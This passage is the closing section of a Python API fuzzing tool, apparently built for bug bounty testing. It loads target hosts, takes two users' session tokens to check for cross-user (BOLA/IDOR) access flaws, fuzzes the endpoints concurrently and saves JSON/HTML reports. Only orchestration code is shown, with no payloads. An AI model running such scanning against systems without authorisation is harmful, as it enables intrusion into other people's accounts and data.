╚══════════════════════════════════════════════════════════════════╝
""")

    if not HAS_HTTPX:
        log.error("httpx required: pip install httpx")
        sys.exit(1)

    if args.session_b and not args.session_a:
        log.error("--session-b requires --session-a")
        sys.exit(1)

    if args.session_a:
        shape_a = detect_session_shape(args.session_a)
        log.info(f"[Config] Session A: {args.session_a[:30]}... (shape={shape_a})")
        if shape_a == "cookie":
            log.info("[Config] Cookie-shaped session detected — using Cookie: header")
    if args.session_b:
        shape_b = detect_session_shape(args.session_b)
        log.info(f"[Config] Session B: {args.session_b[:30]}... (shape={shape_b})")
        log.info("[Config] BOLA/IDOR cross-user verification enabled")
    else:
        log.info("[Config] No session tokens — auth tests will use heuristics only")

    # Load hosts + optional endpoint hints
    endpoint_hints: dict[str, list[APIEndpoint]] = {}
    if args.js:
        endpoint_hints = load_from_jsreaper(args.js, args.domain)
        # Build deduplicated host list, resolving IPs where possible
        seen: set[str] = set()
        unique_hosts = []
        for h in endpoint_hints:
            if h in seen:
                continue
            seen.add(h)
            # Try to resolve IP for the host
            try:
                ip = socket.gethostbyname(h.split(":")[0])
            except Exception:
                ip = h
            # Determine scheme — try HTTPS first
            base = f"https://{h}"
            unique_hosts.append((h, ip, base))
        hosts = unique_hosts
        source = args.js
    elif args.scan:
        hosts  = load_from_recon(args.scan, args.domain)
        source = args.scan
    elif args.spec:
        hosts  = load_spec(args.spec, args.domain)
        source = args.spec
    else:
        hosts  = load_from_urlfile(args.urls)
        source = args.urls

    if not hosts:
        log.error("No hosts found.")
        sys.exit(1)

    report = APIReport(
        domain=args.domain,
        scan_time=datetime.datetime.now(datetime.timezone.utc).isoformat(),
        source_file=source,
        total_hosts=len(hosts),
    )

    fuzzer = APIFuzzer(
        domain=args.domain,
        session_a=args.session_a,
        session_b=args.session_b,
        timeout=args.timeout,
        concurrency=args.concurrency,
        skip_tests=args.skip,
    )

    t0 = time.perf_counter()

    if HAS_RICH:
        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]Fuzzing APIs[/]"),
            BarColumn(),
            TaskProgressColumn(),
            TextColumn("[dim]{task.fields[h]}[/]"),
            console=console,
        ) as prog:
            task = prog.add_task("fuzz", total=len(hosts), h="")
            sem  = asyncio.Semaphore(args.concurrency)

            async def bounded(h: str, ip: str, base: str) -> HostAPIResult:
                async with sem:
                    prog.update(task, h=h)
                    hints = endpoint_hints.get(h)
                    r = await fuzzer.fuzz_host(h, ip, base, hints)
                    prog.advance(task)
                    return r

            results = await asyncio.gather(
                *[bounded(h, ip, base) for h, ip, base in hosts],
                return_exceptions=True,
            )
    else:
        sem = asyncio.Semaphore(args.concurrency)

        async def bounded(h: str, ip: str, base: str) -> HostAPIResult:
            async with sem:
                return await fuzzer.fuzz_host(h, ip, base, endpoint_hints.get(h))

        results = await asyncio.gather(
            *[bounded(h, ip, base) for h, ip, base in hosts],
            return_exceptions=True,
        )

    total_endpoints = 0
    for r in results:
        if isinstance(r, HostAPIResult):
            report.host_results.append(r)
            report.all_findings.extend(r.findings)
            total_endpoints += len(r.endpoints_found)
        elif isinstance(r, Exception):
            log.warning(f"Host error: {r}")

    report.total_endpoints  = total_endpoints
    report.elapsed_seconds  = round(time.perf_counter() - t0, 2)

    print_report(report)

    if args.output:
        out_base = args.output
        if out_base.endswith(".json"):
            out_base = out_base[:-5]
        if out_base.endswith(".html"):
            out_base = out_base[:-5]
        save_json(report, out_base + ".json")
        save_html(report, out_base + ".html")

    crit = len([f for f in report.all_findings if f.severity == "CRITICAL"])
    high = len([f for f in report.all_findings if f.severity == "HIGH"])
    if crit or high:
        log.warning(
            f"[!] {crit} CRITICAL + {high} HIGH findings — "
            f"review immediately and submit to bug bounty program"
        )


if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
